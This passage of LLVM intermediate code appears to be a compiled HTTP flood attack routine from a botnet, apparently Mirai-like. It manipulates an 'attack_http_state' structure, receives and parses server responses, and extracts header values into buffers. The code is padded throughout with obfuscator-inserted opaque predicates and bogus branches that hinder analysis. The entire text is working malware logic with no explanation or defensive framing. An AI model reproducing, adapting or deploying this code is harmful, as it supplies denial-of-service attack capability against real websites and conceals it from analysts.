  %3138 = load i32, i32* %10, align 4
  %3139 = add nsw i32 %3138, 1
  %3140 = sext i32 %3139 to i64
  %3141 = getelementptr inbounds i8, i8* %3137, i64 %3140
  %3142 = call i32 @util_strlen(i8* %3141)
  %3143 = icmp slt i32 %3142, 256
  br i1 %3143, label %3144, label %3200

; <label>:3144:                                   ; preds = %3136
  %3145 = load i32, i32* @x.17
  %3146 = load i32, i32* @y.18
  %3147 = sub i32 %3145, 1
  %3148 = mul i32 %3145, %3147
  %3149 = urem i32 %3148, 2
  %3150 = icmp eq i32 %3149, 0
  %3151 = icmp slt i32 %3146, 10
  %3152 = or i1 %3150, %3151
  br i1 %3152, label %originalBB483, label %originalBB483alteredBB

originalBB483:                                    ; preds = %originalBB483alteredBB, %3144
  %3153 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3154 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3153, i32 0, i32 6
  %3155 = getelementptr inbounds [257 x i8], [257 x i8]* %3154, i32 0, i32 0
  %3156 = getelementptr inbounds i8, i8* %3155, i64 1
  call void @util_zero(i8* %3156, i32 255)
  %3157 = load i8*, i8** %57, align 8
  %3158 = load i32, i32* %10, align 4
  %3159 = add nsw i32 %3158, 1
  %3160 = sext i32 %3159 to i64
  %3161 = getelementptr inbounds i8, i8* %3157, i64 %3160
  %3162 = call i32 @util_strlen(i8* %3161)
  %3163 = icmp sgt i32 %3162, 0
  %3164 = load i32, i32* @x.17
  %3165 = load i32, i32* @y.18
  %3166 = sub i32 %3164, 1
  %3167 = mul i32 %3164, %3166
  %3168 = urem i32 %3167, 2
  %3169 = icmp eq i32 %3168, 0
  %3170 = icmp slt i32 %3165, 10
  %3171 = or i1 %3169, %3170
  br i1 %3171, label %originalBBpart2492, label %originalBB483alteredBB

originalBBpart2492:                               ; preds = %originalBB483
  br i1 %3163, label %3172, label %3199

; <label>:3172:                                   ; preds = %originalBBpart2492
  %3173 = load i32, i32* @x.17
  %3174 = load i32, i32* @y.18
  %3175 = sub i32 %3173, 1
  %3176 = mul i32 %3173, %3175
  %3177 = urem i32 %3176, 2
  %3178 = icmp eq i32 %3177, 0
  %3179 = icmp slt i32 %3174, 10
  %3180 = or i1 %3178, %3179
  br i1 %3180, label %originalBB494, label %originalBB494alteredBB

originalBB494:                                    ; preds = %originalBB494alteredBB, %3172
  %3181 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3181, i32 0, i32 6
  %3183 = getelementptr inbounds [257 x i8], [257 x i8]* %3182, i32 0, i32 0
  %3184 = getelementptr inbounds i8, i8* %3183, i64 1
  %3185 = load i8*, i8** %57, align 8
  %3186 = load i32, i32* %10, align 4
  %3187 = add nsw i32 %3186, 1
  %3188 = sext i32 %3187 to i64
  %3189 = getelementptr inbounds i8, i8* %3185, i64 %3188
  %3190 = call i32 @util_strcpy(i8* %3184, i8* %3189)
  %3191 = load i32, i32* @x.17
  %3192 = load i32, i32* @y.18
  %3193 = sub i32 %3191, 1
  %3194 = mul i32 %3191, %3193
  %3195 = urem i32 %3194, 2
  %3196 = icmp eq i32 %3195, 0
  %3197 = icmp slt i32 %3192, 10
  %3198 = or i1 %3196, %3197
  br i1 %3198, label %originalBBpart2507, label %originalBB494alteredBB

originalBBpart2507:                               ; preds = %originalBB494
  br label %3199

; <label>:3199:                                   ; preds = %originalBBpart2507, %originalBBpart2492
  br label %3200

; <label>:3200:                                   ; preds = %3199, %3136
  br label %3201

; <label>:3201:                                   ; preds = %3200, %originalBBpart2481
  br label %3202

; <label>:3202:                                   ; preds = %3201, %3113
  %3203 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3204 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3203, i32 0, i32 9
  %3205 = getelementptr inbounds [9 x i8], [9 x i8]* %3204, i32 0, i32 0
  %3206 = call i8* @strcpy(i8* %3205, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %3207 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3208 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3207, i32 0, i32 1
  store i8 10, i8* %3208, align 4
  br label %4025

; <label>:3209:                                   ; preds = %2776
  %3210 = load i32, i32* @x.17
  %3211 = load i32, i32* @y.18
  %3212 = sub i32 %3210, 1
  %3213 = mul i32 %3210, %3212
  %3214 = urem i32 %3213, 2
  %3215 = icmp eq i32 %3214, 0
  %3216 = icmp slt i32 %3211, 10
  %3217 = or i1 %3215, %3216
  br i1 %3217, label %originalBB509, label %originalBB509alteredBB

originalBB509:                                    ; preds = %originalBB509alteredBB, %3209
  %3218 = load i32, i32* @x.17
  %3219 = load i32, i32* @y.18
  %3220 = sub i32 %3218, 1
  %3221 = mul i32 %3218, %3220
  %3222 = urem i32 %3221, 2
  %3223 = icmp eq i32 %3222, 0
  %3224 = icmp slt i32 %3219, 10
  %3225 = or i1 %3223, %3224
  br i1 %3225, label %originalBBpart2511, label %originalBB509alteredBB

originalBBpart2511:                               ; preds = %originalBB509
  br label %3226

; <label>:3226:                                   ; preds = %originalBBpart2511, %2671
  br label %3227

; <label>:3227:                                   ; preds = %3226, %originalBBpart2395
  %3228 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %3229 = load i32, i32* %12, align 4
  %3230 = call i32 @util_memsearch(i8* %3228, i32 %3229, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %3230, i32* %37, align 4
  %3231 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3231, i32 0, i32 9
  %3233 = getelementptr inbounds [9 x i8], [9 x i8]* %3232, i32 0, i32 0
  %3234 = call signext i8 @util_strcmp(i8* %3233, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %3235 = sext i8 %3234 to i32
  %3236 = icmp ne i32 %3235, 0
  br i1 %3236, label %3260, label %3237

; <label>:3237:                                   ; preds = %3227
  %3238 = load i32, i32* @x.17
  %3239 = load i32, i32* @y.18
  %3240 = sub i32 %3238, 1
  %3241 = mul i32 %3238, %3240
  %3242 = urem i32 %3241, 2
  %3243 = icmp eq i32 %3242, 0
  %3244 = icmp slt i32 %3239, 10
  %3245 = or i1 %3243, %3244
  br i1 %3245, label %originalBB513, label %originalBB513alteredBB

originalBB513:                                    ; preds = %originalBB513alteredBB, %3237
  %3246 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3247 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3246, i32 0, i32 9
  %3248 = getelementptr inbounds [9 x i8], [9 x i8]* %3247, i32 0, i32 0
  %3249 = call signext i8 @util_strcmp(i8* %3248, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %3250 = sext i8 %3249 to i32
  %3251 = icmp ne i32 %3250, 0
  %3252 = load i32, i32* @x.17
  %3253 = load i32, i32* @y.18
  %3254 = sub i32 %3252, 1
  %3255 = mul i32 %3252, %3254
  %3256 = urem i32 %3255, 2
  %3257 = icmp eq i32 %3256, 0
  %3258 = icmp slt i32 %3253, 10
  %3259 = or i1 %3257, %3258
  br i1 %3259, label %originalBBpart2515, label %originalBB513alteredBB

originalBBpart2515:                               ; preds = %originalBB513
  br i1 %3251, label %3260, label %3263

; <label>:3260:                                   ; preds = %originalBBpart2515, %3227
  %3261 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3262 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3261, i32 0, i32 1
  store i8 7, i8* %3262, align 4
  br label %3290

; <label>:3263:                                   ; preds = %originalBBpart2515
  %3264 = load i32, i32* @x.17
  %3265 = load i32, i32* @y.18
  %3266 = sub i32 %3264, 1
  %3267 = mul i32 %3264, %3266
  %3268 = urem i32 %3267, 2
  %3269 = icmp eq i32 %3268, 0
  %3270 = icmp slt i32 %3265, 10
  %3271 = or i1 %3269, %3270
  br i1 %3271, label %originalBB517, label %originalBB517alteredBB

originalBB517:                                    ; preds = %originalBB517alteredBB, %3263
  %3272 = load i32, i32* %12, align 4
  %3273 = load i32, i32* %37, align 4
  %3274 = icmp sgt i32 %3272, %3273
  %3275 = load i32, i32* @x.17
  %3276 = load i32, i32* @y.18
  %3277 = sub i32 %3275, 1
  %3278 = mul i32 %3275, %3277
  %3279 = urem i32 %3278, 2
  %3280 = icmp eq i32 %3279, 0
  %3281 = icmp slt i32 %3276, 10
  %3282 = or i1 %3280, %3281
  br i1 %3282, label %originalBBpart2519, label %originalBB517alteredBB

originalBBpart2519:                               ; preds = %originalBB517
  br i1 %3274, label %3283, label %3286

; <label>:3283:                                   ; preds = %originalBBpart2519
  %3284 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3285 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3284, i32 0, i32 1
  store i8 10, i8* %3285, align 4
  br label %3289

; <label>:3286:                                   ; preds = %originalBBpart2519
  %3287 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3288 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3287, i32 0, i32 1
  store i8 1, i8* %3288, align 4
  br label %3289

; <label>:3289:                                   ; preds = %3286, %3283
  br label %3290

; <label>:3290:                                   ; preds = %3289, %3260
  %3291 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3292 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3291, i32 0, i32 0
  %3293 = load i32, i32* %3292, align 4
  %3294 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %3295 = load i32, i32* %37, align 4
  %3296 = sext i32 %3295 to i64
  %3297 = call i64 @recv(i32 %3293, i8* %3294, i64 %3296, i32 16384)
  %3298 = trunc i64 %3297 to i32
  store i32 %3298, i32* %12, align 4
  br label %4023

; <label>:3299:                                   ; preds = %1530
  %3300 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3301 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3300, i32 0, i32 1
  %3302 = load i8, i8* %3301, align 4
  %3303 = zext i8 %3302 to i32
  %3304 = icmp eq i32 %3303, 7
  br i1 %3304, label %3305, label %3922

; <label>:3305:                                   ; preds = %3299
  %3306 = load i32, i32* @x.17
  %3307 = load i32, i32* @y.18
  %3308 = sub i32 %3306, 1
  %3309 = mul i32 %3306, %3308
  %3310 = urem i32 %3309, 2
  %3311 = icmp eq i32 %3310, 0
  %3312 = icmp slt i32 %3307, 10
  %3313 = or i1 %3311, %3312
  br i1 %3313, label %originalBB521, label %originalBB521alteredBB

originalBB521:                                    ; preds = %originalBB521alteredBB, %3305
  %3314 = load i32, i32* @x.17
  %3315 = load i32, i32* @y.18
  %3316 = sub i32 %3314, 1
  %3317 = mul i32 %3314, %3316
  %3318 = urem i32 %3317, 2
  %3319 = icmp eq i32 %3318, 0
  %3320 = icmp slt i32 %3315, 10
  %3321 = or i1 %3319, %3320
  br i1 %3321, label %originalBBpart2523, label %originalBB521alteredBB

originalBBpart2523:                               ; preds = %originalBB521
  br label %3322

; <label>:3322:                                   ; preds = %3920, %originalBBpart2523
  %3323 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3323, i32 0, i32 1
  %3325 = load i8, i8* %3324, align 4
  %3326 = zext i8 %3325 to i32
  %3327 = icmp ne i32 %3326, 7
  br i1 %3327, label %3328, label %3345

; <label>:3328:                                   ; preds = %3322
  %3329 = load i32, i32* @x.17
  %3330 = load i32, i32* @y.18
  %3331 = sub i32 %3329, 1
  %3332 = mul i32 %3329, %3331
  %3333 = urem i32 %3332, 2
  %3334 = icmp eq i32 %3333, 0
  %3335 = icmp slt i32 %3330, 10
  %3336 = or i1 %3334, %3335
  br i1 %3336, label %originalBB525, label %originalBB525alteredBB

originalBB525:                                    ; preds = %originalBB525alteredBB, %3328
  %3337 = load i32, i32* @x.17
  %3338 = load i32, i32* @y.18
  %3339 = sub i32 %3337, 1
  %3340 = mul i32 %3337, %3339
  %3341 = urem i32 %3340, 2
  %3342 = icmp eq i32 %3341, 0
  %3343 = icmp slt i32 %3338, 10
  %3344 = or i1 %3342, %3343
  br i1 %3344, label %originalBBpart2527, label %originalBB525alteredBB

originalBBpart2527:                               ; preds = %originalBB525
  br label %3921

; <label>:3345:                                   ; preds = %3322
  %3346 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3347 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3346, i32 0, i32 17
  %3348 = load i32, i32* %3347, align 4
  %3349 = icmp eq i32 %3348, 1024
  br i1 %3349, label %3350, label %3362

; <label>:3350:                                   ; preds = %3345
  %3351 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3352 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3351, i32 0, i32 18
  %3353 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3352, i32 0, i32 0
  %3354 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3355 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3354, i32 0, i32 18
  %3356 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3355, i32 0, i32 0
  %3357 = getelementptr inbounds i8, i8* %3356, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3353, i8* %3357, i64 960, i32 1, i1 false)
  %3358 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3358, i32 0, i32 17
  %3360 = load i32, i32* %3359, align 4
  %3361 = sub nsw i32 %3360, 64
  store i32 %3361, i32* %3359, align 4
  br label %3362

; <label>:3362:                                   ; preds = %3350, %3345
  %3363 = load i32, i32* @x.17
  %3364 = load i32, i32* @y.18
  %3365 = sub i32 %3363, 1
  %3366 = mul i32 %3363, %3365
  %3367 = urem i32 %3366, 2
  %3368 = icmp eq i32 %3367, 0
  %3369 = icmp slt i32 %3364, 10
  %3370 = or i1 %3368, %3369
  br i1 %3370, label %originalBB529, label %originalBB529alteredBB

originalBB529:                                    ; preds = %originalBB529alteredBB, %3362
  %3371 = call i32* @__errno_location() #7
  store i32 0, i32* %3371, align 4
  %3372 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3373 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3372, i32 0, i32 0
  %3374 = load i32, i32* %3373, align 4
  %3375 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3376 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3375, i32 0, i32 18
  %3377 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3376, i32 0, i32 0
  %3378 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3379 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3378, i32 0, i32 17
  %3380 = load i32, i32* %3379, align 4
  %3381 = sext i32 %3380 to i64
  %3382 = getelementptr inbounds i8, i8* %3377, i64 %3381
  %3383 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3384 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3383, i32 0, i32 17
  %3385 = load i32, i32* %3384, align 4
  %3386 = sub nsw i32 1024, %3385
  %3387 = sext i32 %3386 to i64
  %3388 = call i64 @recv(i32 %3374, i8* %3382, i64 %3387, i32 16384)
  %3389 = trunc i64 %3388 to i32
  store i32 %3389, i32* %12, align 4
  %3390 = load i32, i32* %12, align 4
  %3391 = icmp eq i32 %3390, 0
  %3392 = load i32, i32* @x.17
  %3393 = load i32, i32* @y.18
  %3394 = sub i32 %3392, 1
  %3395 = mul i32 %3392, %3394
  %3396 = urem i32 %3395, 2
  %3397 = icmp eq i32 %3396, 0
  %3398 = icmp slt i32 %3393, 10
  %3399 = or i1 %3397, %3398
  br i1 %3399, label %originalBBpart2539, label %originalBB529alteredBB

originalBBpart2539:                               ; preds = %originalBB529
  br i1 %3391, label %3400, label %3418

; <label>:3400:                                   ; preds = %originalBBpart2539
  %3401 = load i32, i32* @x.17
  %3402 = load i32, i32* @y.18
  %3403 = sub i32 %3401, 1
  %3404 = mul i32 %3401, %3403
  %3405 = urem i32 %3404, 2
  %3406 = icmp eq i32 %3405, 0
  %3407 = icmp slt i32 %3402, 10
  %3408 = or i1 %3406, %3407
  br i1 %3408, label %originalBB541, label %originalBB541alteredBB

originalBB541:                                    ; preds = %originalBB541alteredBB, %3400
  %3409 = call i32* @__errno_location() #7
  store i32 104, i32* %3409, align 4
  store i32 -1, i32* %12, align 4
  %3410 = load i32, i32* @x.17
  %3411 = load i32, i32* @y.18
  %3412 = sub i32 %3410, 1
  %3413 = mul i32 %3410, %3412
  %3414 = urem i32 %3413, 2
  %3415 = icmp eq i32 %3414, 0
  %3416 = icmp slt i32 %3411, 10
  %3417 = or i1 %3415, %3416
  br i1 %3417, label %originalBBpart2543, label %originalBB541alteredBB

originalBBpart2543:                               ; preds = %originalBB541
  br label %3418

; <label>:3418:                                   ; preds = %originalBBpart2543, %originalBBpart2539
  %3419 = load i32, i32* %12, align 4
  %3420 = icmp eq i32 %3419, -1
  br i1 %3420, label %3421, label %3455

; <label>:3421:                                   ; preds = %3418
  %3422 = call i32* @__errno_location() #7
  %3423 = load i32, i32* %3422, align 4
  %3424 = icmp ne i32 %3423, 11
  br i1 %3424, label %3425, label %3454

; <label>:3425:                                   ; preds = %3421
  %3426 = call i32* @__errno_location() #7
  %3427 = load i32, i32* %3426, align 4
  %3428 = icmp ne i32 %3427, 11
  br i1 %3428, label %3429, label %3454

; <label>:3429:                                   ; preds = %3425
  %3430 = load i32, i32* @x.17
  %3431 = load i32, i32* @y.18
  %3432 = sub i32 %3430, 1
  %3433 = mul i32 %3430, %3432
  %3434 = urem i32 %3433, 2
  %3435 = icmp eq i32 %3434, 0
  %3436 = icmp slt i32 %3431, 10
  %3437 = or i1 %3435, %3436
  br i1 %3437, label %originalBB545, label %originalBB545alteredBB

originalBB545:                                    ; preds = %originalBB545alteredBB, %3429
  %3438 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3439 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3438, i32 0, i32 0
  %3440 = load i32, i32* %3439, align 4
  %3441 = call i32 @close(i32 %3440)
  %3442 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3443 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3442, i32 0, i32 0
  store i32 -1, i32* %3443, align 4
  %3444 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3445 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3444, i32 0, i32 1
  store i8 0, i8* %3445, align 4
  %3446 = load i32, i32* @x.17
  %3447 = load i32, i32* @y.18
  %3448 = sub i32 %3446, 1
  %3449 = mul i32 %3446, %3448
  %3450 = urem i32 %3449, 2
  %3451 = icmp eq i32 %3450, 0
  %3452 = icmp slt i32 %3447, 10
  %3453 = or i1 %3451, %3452
  br i1 %3453, label %originalBBpart2547, label %originalBB545alteredBB

originalBBpart2547:                               ; preds = %originalBB545
  br label %3454

; <label>:3454:                                   ; preds = %originalBBpart2547, %3425, %3421
  br label %3921

; <label>:3455:                                   ; preds = %3418
  %3456 = load i32, i32* %12, align 4
  %3457 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3458 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3457, i32 0, i32 17
  %3459 = load i32, i32* %3458, align 4
  %3460 = add nsw i32 %3459, %3456
  store i32 %3460, i32* %3458, align 4
  %3461 = load i32, i32* %27, align 4
  %3462 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3463 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3462, i32 0, i32 2
  store i32 %3461, i32* %3463, align 4
  br label %3464

; <label>:3464:                                   ; preds = %3919, %3455
  store i32 0, i32* %59, align 4
  %3465 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3466 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3465, i32 0, i32 14
  %3467 = load i32, i32* %3466, align 4
  %3468 = icmp sgt i32 %3467, 0
  br i1 %3468, label %3469, label %3688

; <label>:3469:                                   ; preds = %3464
  %3470 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3471 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3470, i32 0, i32 14
  %3472 = load i32, i32* %3471, align 4
  %3473 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3474 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3473, i32 0, i32 17
  %3475 = load i32, i32* %3474, align 4
  %3476 = icmp sgt i32 %3472, %3475
  br i1 %3476, label %3477, label %3497

; <label>:3477:                                   ; preds = %3469
  %3478 = load i32, i32* @x.17
  %3479 = load i32, i32* @y.18
  %3480 = sub i32 %3478, 1
  %3481 = mul i32 %3478, %3480
  %3482 = urem i32 %3481, 2
  %3483 = icmp eq i32 %3482, 0
  %3484 = icmp slt i32 %3479, 10
  %3485 = or i1 %3483, %3484
  br i1 %3485, label %originalBB549, label %originalBB549alteredBB

originalBB549:                                    ; preds = %originalBB549alteredBB, %3477
  %3486 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3487 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3486, i32 0, i32 17
  %3488 = load i32, i32* %3487, align 4
  %3489 = load i32, i32* @x.17
  %3490 = load i32, i32* @y.18
  %3491 = sub i32 %3489, 1
  %3492 = mul i32 %3489, %3491
  %3493 = urem i32 %3492, 2
  %3494 = icmp eq i32 %3493, 0
  %3495 = icmp slt i32 %3490, 10
  %3496 = or i1 %3494, %3495
  br i1 %3496, label %originalBBpart2551, label %originalBB549alteredBB

originalBBpart2551:                               ; preds = %originalBB549
  br label %3501

; <label>:3497:                                   ; preds = %3469
  %3498 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3499 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3498, i32 0, i32 14
  %3500 = load i32, i32* %3499, align 4
  br label %3501

; <label>:3501:                                   ; preds = %3497, %originalBBpart2551
  %3502 = phi i32 [ %3488, %originalBBpart2551 ], [ %3500, %3497 ]
  store i32 %3502, i32* %59, align 4
  %3503 = load i32, i32* %59, align 4
  %3504 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3505 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3504, i32 0, i32 14
  %3506 = load i32, i32* %3505, align 4
  %3507 = sub nsw i32 %3506, %3503
  store i32 %3507, i32* %3505, align 4
  %3508 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3509 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3508, i32 0, i32 11
  %3510 = load i32, i32* %3509, align 4
  %3511 = icmp eq i32 %3510, 1
  br i1 %3511, label %3512, label %3687

; <label>:3512:                                   ; preds = %3501
  %3513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3513, i32 0, i32 18
  %3515 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3514, i32 0, i32 0
  %3516 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3517 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3516, i32 0, i32 17
  %3518 = load i32, i32* %3517, align 4
  %3519 = call i8* @table_retrieve_val(i32 43, i32* null)
  %3520 = call i32 @util_memsearch(i8* %3515, i32 %3518, i8* %3519, i32 11)
  %3521 = icmp ne i32 %3520, -1
  br i1 %3521, label %3522, label %3686

; <label>:3522:                                   ; preds = %3512
  %3523 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3524 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3523, i32 0, i32 18
  %3525 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3524, i32 0, i32 0
  %3526 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3526, i32 0, i32 17
  %3528 = load i32, i32* %3527, align 4
  %3529 = call i8* @table_retrieve_val(i32 43, i32* null)
  %3530 = call i32 @util_memsearch(i8* %3525, i32 %3528, i8* %3529, i32 11)
  store i32 %3530, i32* %60, align 4
  %3531 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3532 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3531, i32 0, i32 18
  %3533 = load i32, i32* %60, align 4
  %3534 = sext i32 %3533 to i64
  %3535 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3532, i64 0, i64 %3534
  %3536 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3537 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3536, i32 0, i32 17
  %3538 = load i32, i32* %3537, align 4
  %3539 = load i32, i32* %60, align 4
  %3540 = sub nsw i32 %3538, %3539
  %3541 = call i32 @util_memsearch(i8* %3535, i32 %3540, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %3541, i32* %61, align 4
  %3542 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3543 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3542, i32 0, i32 18
  %3544 = load i32, i32* %60, align 4
  %3545 = load i32, i32* %61, align 4
  %3546 = sub nsw i32 %3545, 1
  %3547 = add nsw i32 %3544, %3546
  %3548 = sext i32 %3547 to i64
  %3549 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3543, i64 0, i64 %3548
  store i8 0, i8* %3549, align 1
  %3550 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3551 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3550, i32 0, i32 15
  %3552 = load i32, i32* %3551, align 4
  %3553 = icmp slt i32 %3552, 5
  br i1 %3553, label %3554, label %3665

; <label>:3554:                                   ; preds = %3522
  %3555 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3556 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3555, i32 0, i32 18
  %3557 = load i32, i32* %60, align 4
  %3558 = sext i32 %3557 to i64
  %3559 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3556, i64 0, i64 %3558
  %3560 = call i32 @util_strlen(i8* %3559)
  %3561 = icmp slt i32 %3560, 128
  br i1 %3561, label %3562, label %3665

; <label>:3562:                                   ; preds = %3554
  %3563 = load i32, i32* @x.17
  %3564 = load i32, i32* @y.18
  %3565 = sub i32 %3563, 1
  %3566 = mul i32 %3563, %3565
  %3567 = urem i32 %3566, 2
  %3568 = icmp eq i32 %3567, 0
  %3569 = icmp slt i32 %3564, 10
  %3570 = or i1 %3568, %3569
  br i1 %3570, label %originalBB553, label %originalBB553alteredBB

originalBB553:                                    ; preds = %originalBB553alteredBB, %3562
  %3571 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3572 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3571, i32 0, i32 16
  %3573 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3574 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3573, i32 0, i32 15
  %3575 = load i32, i32* %3574, align 4
  %3576 = sext i32 %3575 to i64
  %3577 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3572, i64 0, i64 %3576
  %3578 = getelementptr inbounds [128 x i8], [128 x i8]* %3577, i32 0, i32 0
  %3579 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3580 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3579, i32 0, i32 18
  %3581 = load i32, i32* %60, align 4
  %3582 = sext i32 %3581 to i64
  %3583 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3580, i64 0, i64 %3582
  %3584 = call i32 @util_strcpy(i8* %3578, i8* %3583)
  %3585 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3585, i32 0, i32 16
  %3587 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3588 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3587, i32 0, i32 15
  %3589 = load i32, i32* %3588, align 4
  %3590 = sext i32 %3589 to i64
  %3591 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3586, i64 0, i64 %3590
  %3592 = getelementptr inbounds [128 x i8], [128 x i8]* %3591, i32 0, i32 0
  %3593 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3594 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3593, i32 0, i32 16
  %3595 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3596 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3595, i32 0, i32 15
  %3597 = load i32, i32* %3596, align 4
  %3598 = sext i32 %3597 to i64
  %3599 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3594, i64 0, i64 %3598
  %3600 = getelementptr inbounds [128 x i8], [128 x i8]* %3599, i32 0, i32 0
